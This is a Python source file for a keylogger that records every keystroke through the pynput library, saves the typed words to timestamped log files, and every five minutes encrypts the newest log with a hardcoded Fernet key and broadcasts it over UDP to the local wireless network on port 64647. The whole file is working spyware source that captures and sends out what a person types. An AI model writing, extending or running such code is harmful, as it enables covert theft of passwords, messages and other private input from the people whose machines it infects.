import datetime
import os
import socket
import time
from pynput.keyboard import Key, Listener
import threading
from cryptography.fernet import Fernet
import netifaces

def get_wlan_broadcast_ip():
    for interface in netifaces.interfaces():
        if interface.startswith("wl"):
            broadcast_ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]["broadcast"]
            return broadcast_ip
            
word = ""
current_hour = -1
broadcast_ip = get_wlan_broadcast_ip()
port = 64647

def on_press(key):
    global word
    try:
        print(f'Key {key.char} pressed')
        word = word + key.char

    except AttributeError:
        print(f'Special key {key} pressed')

def on_release(key):
    global word

    if key == Key.esc:
        return False

    if key == Key.backspace:
        word = word[:-1]

    if key in [Key.space, Key.enter, Key.tab]:
        saveWords(word)
        print("Full Word ^:=:^ " + word)
        word = ""

def getLogs():
    directory_path = "saved"
    try:
        files = os.listdir(directory_path)
        files.sort(key=lambda x: os.path.getmtime(os.path.join(directory_path, x)), reverse=True)
        latest_file = files[0] if files else None
        return latest_file

    except Exception as e:
        print(f"Hata: {e}")
        return None

def saveWords(wrd):
    global current_hour
    e = datetime.datetime.now()

    if e.hour != current_hour:
        current_hour = e.hour
        save = open(f"saved/save_{e.day}-{e.month}_{e.hour};{e.minute // 10 * 10}", "a")
    else:
        save = open(f"saved/save_{e.day}-{e.month}_{e.hour};{e.minute // 10 * 10}", "a")
    if not wrd == "":
        save.write(wrd + "\n")


def display_message_every_5_minutes():
    while True:
        now = datetime.datetime.now()
        if now.minute % 5 == 0 and now.second == 0:
            fileName = getLogs()
            print(fileName)
            file = open("saved/"+fileName,"r")
            message = file.read()
          
            #key = Fernet.generate_key()
            key = "eVb-cKIXtOH4W1iD-3X62m8XgIKX8d34dyJsuQ3EU8I="
            message = message.encode()
            cipher_suite = Fernet(key)
            ciphertext = cipher_suite.encrypt(message)
          
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.sendto(ciphertext, (broadcast_ip, port))
            sock.close()

        time.sleep(1)


if __name__ == "__main__":
    threading.Thread(target=display_message_every_5_minutes).start()

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
